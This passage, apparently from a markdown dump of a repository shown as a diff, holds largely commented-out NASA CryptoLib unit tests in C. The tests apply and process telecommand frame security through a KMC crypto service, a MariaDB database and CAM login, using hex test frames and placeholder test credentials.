+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 8, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "202C202E00000D000000020001482F52BA9B9411B46C8ABD6F5DF9FC63A2CE8EB3FC7D83EE488DA7A88D49FDFC4264"; char*
+//     enc_tc_jpl_mmt_scid44_vcid1_expect = NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: See test name for description of whats being exercised!
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_HMAC512_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 9, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c2408000001bb40";
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: HAPPY_PATH_PROCESS_SEC_HMAC512_AUTH_ONLY
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_HMAC512_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 9, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     // char* enc_tc_jpl_mmt_scid44_vcid1= "202C1C1A0000050001C50827915AEB423F054402D5DC3C67566986"; // Returns
+//     CRYPTO_LIB_ERR_INVALID_HEADER since SN/ARC missing from header
+//     // char* enc_tc_jpl_mmt_scid44_vcid1= "202C1C1E000005000000050001C7BA93010000000000000000000000007ACC";  //
+//     Invalid MAC, should fail with error 510 char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "202C244E00000E000000010001113F476FA33E4AF40C9E8D4A013FCB6AADA140B2CA5CA3FA18897C5D3084188ED127CCFAB7B5F063700AB3976E18A9713694922C11F0DB5F97277107C0712DC76557";
+//     char* enc_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// /**
+//  * @brief Unit Test: HAPPY_PATH_APPLY_SEC_HMAC512_TRUNCATED_16BYTE_MAC_AUTH_ONLY
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_HMAC512_TRUNCATED_16BYTE_MAC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 10, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c2808000001bb40";
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: HAPPY_PATH_PROCESS_SEC_HMAC512_TRUNCATED_16BYTE_MAC_AUTH_ONLY
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_HMAC512_TRUNCATED_16BYTE_MAC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 10, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     // char* enc_tc_jpl_mmt_scid44_vcid1= "202C1C1A0000050001C50827915AEB423F054402D5DC3C67566986"; // Returns
+//     CRYPTO_LIB_ERR_INVALID_HEADER since SN/ARC missing from header
+//     // char* enc_tc_jpl_mmt_scid44_vcid1= "202C1C1E000005000000050001C7BA93010000000000000000000000007ACC";  //
+//     Invalid MAC, should fail with error 510 char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "202C281E00000F0000000200011100B088C804DFA2B04AAF8780553E3C9615"; char* enc_tc_jpl_mmt_scid44_vcid1_expect =
+//     NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     // ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+UTEST_MAIN();
+```
+
+### `ut_kmc_crypto_cam.c`
+
+**경로:** `components/cryptolib/test/kmc/ut_kmc_crypto_cam.c`
+
+
+```c
+/* Copyright (C) 2009 - 2022 National Aeronautics and Space Administration.
+   All Foreign Rights are Reserved to the U.S. Government.
+
+   This software is provided "as is" without any warranty of any kind, either expressed, implied, or statutory,
+   including, but not limited to, any warranty that the software will conform to specifications, any implied warranties
+   of merchantability, fitness for a particular purpose, and freedom from infringement, and any warranty that the
+   documentation will conform to the program, or any warranty that the software will be error free.
+
+   In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or
+   consequential damages, arising out of, resulting from, or in any way connected with the software or its
+   documentation, whether or not based upon warranty, contract, tort or otherwise, and whether or not loss was sustained
+   from, or arose out of the results of, or use of, the software, documentation or services provided hereunder.
+
+   ITC Team
+   NASA IV&V
+   jstar-development-team@mail.nasa.gov
+*/
+
+/**
+ *  Unit Tests that make use of TC_ApplySecurity/TC_ProcessSecurity function on the data with KMC Crypto Service/MariaDB
+ *Functionality Enabled.
+ **/
+#include "crypto.h"
+#include "crypto_error.h"
+#include "sa_interface.h"
+#include "utest.h"
+
+#include "shared_util.h"
+#include <stdio.h>
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_KERBEROS_KEYTAB_FILE)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+// //
+// Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,"https://asec-dev-vm10.jpl.nasa.gov:443",
+// NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file","/home/isaleh/secret/testuser3300.kt",CAM_LOGIN_KEYTAB_FILE,"https://asec-dev-vm10.jpl.nasa.gov:443",
+//     "testuser3300", NULL);
+// //
+// Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_KERBEROS,"https://asec-dev-vm10.jpl.nasa.gov:443",
+// NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c0408000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_KERBEROS)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+// //
+// Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,"https://asec-dev-vm10.jpl.nasa.gov:443",
+// NULL, NULL);
+// //
+// Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file","/home/isaleh/secret/testuser3300.kt",CAM_LOGIN_KEYTAB_FILE,"https://asec-dev-vm10.jpl.nasa.gov:443",
+// "testuser3300", NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_KERBEROS,"https://asec-dev-vm10.jpl.nasa.gov:443",
+//     NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x002C, 3, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c0408000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3,
